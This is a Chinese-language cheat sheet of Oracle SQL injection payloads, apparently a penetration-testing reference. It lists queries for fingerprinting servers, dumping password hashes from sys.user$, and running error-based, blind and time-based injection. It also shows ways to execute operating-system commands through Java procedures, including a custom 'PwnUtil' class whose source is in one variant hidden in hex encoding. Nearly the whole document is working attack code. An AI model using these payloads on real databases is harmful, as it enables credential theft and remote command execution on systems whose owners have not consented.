# Oracle SQL 注入

## 摘要

* [Oracle SQL 默认数据库](#oracle-sql-default-databases)
* [Oracle SQL 注释](#oracle-sql-comments)
* [Oracle SQL 版本](#oracle-sql-version)
* [Oracle SQL 主机名](#oracle-sql-hostname)
* [Oracle SQL 数据库名称](#oracle-sql-database-name)
* [Oracle SQL 数据库凭据](#oracle-sql-database-credentials)
* [Oracle SQL 列出数据库](#oracle-sql-list-databases)
* [Oracle SQL 列出列](#oracle-sql-list-columns)
* [Oracle SQL 列出表](#oracle-sql-list-tables)
* [Oracle SQL 基于错误](#oracle-sql-error-based)
* [Oracle SQL 盲注](#oracle-sql-blind)
* [Oracle SQL 基于时间](#oracle-sql-time-based)
* [Oracle SQL 命令执行](#oracle-sql-command-execution)
* [参考资料](#references)


## Oracle SQL 默认数据库

| 名称   | 描述           |
| ------ | -------------- |
| SYSTEM | 所有版本中可用 |
| SYSAUX | 所有版本中可用 |


## Oracle SQL 注释

| 类型   | 描述     |
| ------ | -------- |
| `-- -` | SQL 注释 |


## Oracle SQL 版本

```sql
SELECT user FROM dual UNION SELECT * FROM v$version
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;
```

## Oracle SQL 主机名

```sql
SELECT host_name FROM v$instance; (需要特权)
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
SELECT UTL_INADDR.get_host_address FROM dual;
```


## Oracle SQL 数据库名称

```sql
SELECT global_name FROM global_name;
SELECT name FROM V$DATABASE;
SELECT instance_name FROM V$INSTANCE;
SELECT SYS.DATABASE_NAME FROM DUAL;
```

## Oracle SQL 数据库凭据

| 查询                                    | 描述             |
| --------------------------------------- | ---------------- |
| `SELECT username FROM all_users;`       | 所有版本中可用   |
| `SELECT name, password from sys.user$;` | 需要特权, <= 10g |
| `SELECT name, spare4 from sys.user$;`   | 需要特权, <= 11g |


## Oracle SQL 列出数据库

```sql
SELECT DISTINCT owner FROM all_tables;
```

## Oracle SQL 列出列

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
```

## Oracle SQL 列出表

```sql
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
```

## Oracle SQL 基于错误

| 描述              | 查询                                                         |
| :---------------- | :----------------------------------------------------------- |
| 无效的 HTTP 请求  | SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual |
| CTXSYS.DRITHSX.SN | SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual |
| 无效的 XPath      | SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual |
| 无效的 XML        | SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual |
| 无效的 XML        | SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users |
| SQL 错误          | SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) |


## Oracle SQL 盲注

| 描述                             | 查询                                                         |
| :------------------------------- | :----------------------------------------------------------- |
| 版本是 12.2                      | SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%'; |
| 子查询已启用                     | SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)              |
| 表 log_table 存在                | SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);        |
| 列 message 存在于表 log_table 中 | SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; |
| 第一条消息的第一个字母是 t       | SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%'; |


## Oracle SQL 基于时间

```sql
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
```


## Oracle SQL 命令执行

* [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)

### Oracle Java 执行

* 列出 Java 权限

  ```sql
  select * from dba_java_policy
  select * from user_java_policy
  ```

* 授予权限

  ```sql
  exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
  exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
  exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
  ```

* 执行命令

  * 10g R2, 11g R1 和 R2: `DBMS_JAVA_TEST.FUNCALL()`

  ```sql
  SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
  SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
  ```

  * 11g R1 和 R2: `DBMS_JAVA.RUNJAVA()`

  ```sql
  SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
  ```


### Oracle Java 类

```sql
/* 创建 Java 类 */
BEGIN
EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "
";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "
";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';
END;
/

BEGIN
EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
END;
/

/* 运行操作系统命令 */
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
```

或 (十六进制编码)

```sql
/* 创建 Java 类 */
SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e7075745374726561646572282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6728292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual

/* 运行操作系统命令 */
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
```

## 参考资料

* [NetSpi - SQL Wiki](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
* [ASDC12 - 新改进的从 Web 黑客攻击 Oracle](https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)
* [渗透测试 Oracle TNS 监听器 - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
* [ODAT: Oracle 数据库攻击工具](https://github.com/quentinhardy/odat/wiki/privesc)
* [WebSec CheatSheet - Oracle](https://www.websec.ca/kb/sql_injection#Oracle_Default_Databases)